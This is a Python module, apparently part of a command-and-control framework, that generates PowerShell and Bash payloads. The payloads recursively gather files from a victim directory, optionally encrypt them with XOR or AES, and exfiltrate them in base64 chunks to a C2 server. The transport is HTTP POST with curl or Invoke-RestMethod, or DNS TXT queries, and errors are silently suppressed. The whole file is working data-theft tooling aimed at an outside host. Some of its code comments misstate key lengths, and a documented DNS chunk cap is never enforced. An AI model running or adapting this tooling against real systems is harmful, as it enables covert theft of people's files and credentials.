import os
import base64

from sqlmodel import Session

from .base_module import BaseModule


class Exfiltration(BaseModule):
    """Data exfiltration payload generator.

    Transports: ``http`` (POST chunks to /agent/<id>/exfil)
                ``dns`` (TXT-record queries carrying base64 fragments)

    Encryption layer (applied before base64 transport encoding):
        ``none``  — raw base64
        ``xor``   — XOR with random single-byte key, then base64
        ``aes``   — AES-256-CBC with random key+IV, then base64
                    (key+IV sent in first chunk metadata)

    Parameters
    ----------
    target_directory : str   — path to exfiltrate
    file_extensions  : list  — filter (empty = all files)
    transport        : str   — "http" | "dns"
    c2_server        : str   — C2 callback address  (e.g. "10.0.0.1:8000")
    dns_domain       : str   — domain for DNS exfil (e.g. "exfil.lab.local")
    encryption       : str   — "none" | "xor" | "aes"
    chunk_size       : int   — bytes per chunk (default 4096, dns caps at 180)
    """

    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        target_directory: str = params.get("target_directory", "/tmp")
        file_extensions: list[str] = params.get("file_extensions", [])
        transport: str = params.get("transport", "http")
        c2_server: str = params.get("c2_server", "127.0.0.1:8000")
        dns_domain: str = params.get("dns_domain", "exfil.lab.local")
        encryption: str = params.get("encryption", "none")
        chunk_size: int = int(params.get("chunk_size", 4096))

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            script = self._build_ps_script(
                target_id, target_directory, file_extensions,
                transport, c2_server, dns_domain, encryption, chunk_size,
            )
            return self._wrap_powershell(script)
        else:
            script = self._build_bash_script(
                target_id, target_directory, file_extensions,
                transport, c2_server, dns_domain, encryption, chunk_size,
            )
            return self._wrap_bash(script)

    # ─── Windows / PowerShell ─────────────────────────────────────────

    @staticmethod
    def _build_ps_script(
        target_id: str,
        target_dir: str,
        extensions: list[str],
        transport: str,
        c2: str,
        dns_domain: str,
        encryption: str,
        chunk_size: int,
    ) -> str:
        ext_filter = ""
        if extensions:
            clauses = " -or ".join(f'$_.Extension -eq "{e}"' for e in extensions)
            ext_filter = f' | Where-Object {{ {clauses} }}'

        # Encryption helpers embedded in the script
        enc_block = ""
        if encryption == "xor":
            enc_block = r'''
$xorKey = Get-Random -Minimum 1 -Maximum 256
function Encrypt-Bytes($bytes) {
    $out = New-Object byte[] $bytes.Length
    for ($i=0; $i -lt $bytes.Length; $i++) { $out[$i] = $bytes[$i] -bxor $xorKey }
    return $out
}
$encName = "xor"
$encMeta = "$xorKey"
'''
        elif encryption == "aes":
            enc_block = r'''
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.GenerateKey(); $aes.GenerateIV()
$encName = "aes"
$encMeta = [Convert]::ToBase64String($aes.Key) + "|" + [Convert]::ToBase64String($aes.IV)
function Encrypt-Bytes($bytes) {
    $enc = $aes.CreateEncryptor()
    return $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
}
'''
        else:
            enc_block = r'''
$encName = "none"
$encMeta = ""
function Encrypt-Bytes($bytes) { return $bytes }
'''

        # Transport helpers
        if transport == "dns":
            send_fn = f'''
function Send-Chunk($fname, $idx, $total, $b64) {{
    # Split b64 into 63-char DNS labels (max label length)
    $labels = @()
    for ($j=0; $j -lt $b64.Length; $j+=63) {{
        $labels += $b64.Substring($j, [Math]::Min(63, $b64.Length - $j))
    }}
    $qname = ($labels -join ".") + ".{dns_domain}"
    try {{ Resolve-DnsName -Name $qname -Type TXT -ErrorAction SilentlyContinue }} catch {{ }}
}}
'''
        else:
            send_fn = f'''
function Send-Chunk($fname, $idx, $total, $b64) {{
    $body = @{{
        filename       = $fname
        chunk_index    = $idx
        total_chunks   = $total
        data_b64       = $b64
        encryption     = $encName
        encryption_meta = $encMeta
        session_id     = $sessionId
    }} | ConvertTo-Json
    try {{
        Invoke-RestMethod -Uri "http://{c2}/api/v1/agent/{target_id}/exfil" `
            -Method POST -ContentType "application/json" -Body $body | Out-Null
    }} catch {{ }}
}}
'''

        return f'''
{enc_block}
{send_fn}
$chunkSize = {chunk_size}
$sessionId = [System.Guid]::NewGuid().ToString()
$files = Get-ChildItem -Path "{target_dir}" -Recurse -File{ext_filter}
foreach ($f in $files) {{
    try {{
        $raw = [IO.File]::ReadAllBytes($f.FullName)
        $enc = Encrypt-Bytes $raw
        $total = [Math]::Ceiling($enc.Length / $chunkSize)
        if ($total -eq 0) {{ $total = 1 }}
        for ($i = 0; $i -lt $total; $i++) {{
            $start = $i * $chunkSize
            $len   = [Math]::Min($chunkSize, $enc.Length - $start)
            $slice = New-Object byte[] $len
            [Array]::Copy($enc, $start, $slice, 0, $len)
            $b64 = [Convert]::ToBase64String($slice)
            Send-Chunk $f.Name $i $total $b64
        }}
    }} catch {{ }}
}}
'''

    # ─── Linux / Bash ─────────────────────────────────────────────────

    @staticmethod
    def _build_bash_script(
        target_id: str,
        target_dir: str,
        extensions: list[str],
        transport: str,
        c2: str,
        dns_domain: str,
        encryption: str,
        chunk_size: int,
    ) -> str:
        # Build find expression
        if extensions:
            find_expr = " -o ".join(f'-name "*{e}"' for e in extensions)
            find_cmd = f'find "{target_dir}" -type f \\( {find_expr} \\)'
        else:
            find_cmd = f'find "{target_dir}" -type f'

        # Encryption
        if encryption == "xor":
            enc_setup = 'XOR_KEY=$((RANDOM % 255 + 1))\nENC_NAME="xor"\nENC_META="$XOR_KEY"'
            enc_fn = r'''
encrypt_file() {
    python3 -c "
import sys
key=$XOR_KEY
data=open('$1','rb').read()
sys.stdout.buffer.write(bytes(b^key for b in data))
" 2>/dev/null || perl -e "
open F,'<','$1'; binmode F; read F,\$d,-s '$1';
print join('',map{chr(ord($_)^$XOR_KEY)}split(//,\$d));
"
}
'''
        elif encryption == "aes":
            enc_setup = (
                'AES_KEY=$(openssl rand -hex 64)\n'  # 64 hex chars = 32 bytes = 256 bits
                'AES_IV=$(openssl rand -hex 32)\n'   # 32 hex chars = 16 bytes = 128 bits
                'ENC_NAME="aes"\n'
                'ENC_META="${AES_KEY}|${AES_IV}"'
            )
            enc_fn = r'''
encrypt_file() {
    openssl enc -aes-256-cbc -in "$1" -K "$AES_KEY" -iv "$AES_IV" 2>/dev/null
}
'''
        else:
            enc_setup = 'ENC_NAME="none"\nENC_META=""'
            enc_fn = r'''
encrypt_file() {
    cat "$1"
}
'''

        # Transport
        if transport == "dns":
            send_fn = f'''
send_chunk() {{
    local FNAME="$1" IDX="$2" TOTAL="$3" B64="$4"
    # Split into 63-char labels for DNS
    LABELS=$(echo "$B64" | fold -w63 | paste -sd'.' -)
    dig +short TXT "${{LABELS}}.{dns_domain}" @{c2.split(":")[0]} 2>/dev/null || true
}}
'''
        else:
            send_fn = f'''
send_chunk() {{
    local FNAME="$1" IDX="$2" TOTAL="$3" B64="$4"
    # Properly escape the encryption_meta for JSON
    local ESCAPED_META=$(printf '%s' "$ENC_META" | sed 's/"/\\"/g' | sed "s/'/\\'/g")
    curl -s -X POST "http://{c2}/api/v1/agent/{target_id}/exfil" \\
        -H "Content-Type: application/json" \\
        -d "$(cat <<EOJSON
{{"filename":"$FNAME","chunk_index":$IDX,"total_chunks":$TOTAL,"data_b64":"$B64","encryption":"$ENC_NAME","encryption_meta":"$ESCAPED_META","session_id":"$SESSION_ID"}}
EOJSON
)" >/dev/null 2>&1 || true
}}
'''

        return f'''#!/bin/bash
{enc_setup}
{enc_fn}
{send_fn}
CHUNK_SIZE={chunk_size}
SESSION_ID=$(uuidgen 2>/dev/null || python3 -c "import uuid; print(uuid.uuid4())" 2>/dev/null || echo "session_$(date +%s)_$$")

{find_cmd} | while IFS= read -r file; do
    FNAME=$(basename "$file")
    ENCRYPTED=$(encrypt_file "$file" | base64 -w0)
    TOTAL_LEN=${{#ENCRYPTED}}
    TOTAL=$(( (TOTAL_LEN + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    [ "$TOTAL" -eq 0 ] && TOTAL=1
    for (( i=0; i<TOTAL; i++ )); do
        OFFSET=$(( i * CHUNK_SIZE ))
        CHUNK="${{ENCRYPTED:$OFFSET:$CHUNK_SIZE}}"
        send_chunk "$FNAME" "$i" "$TOTAL" "$CHUNK"
    done
done
'''
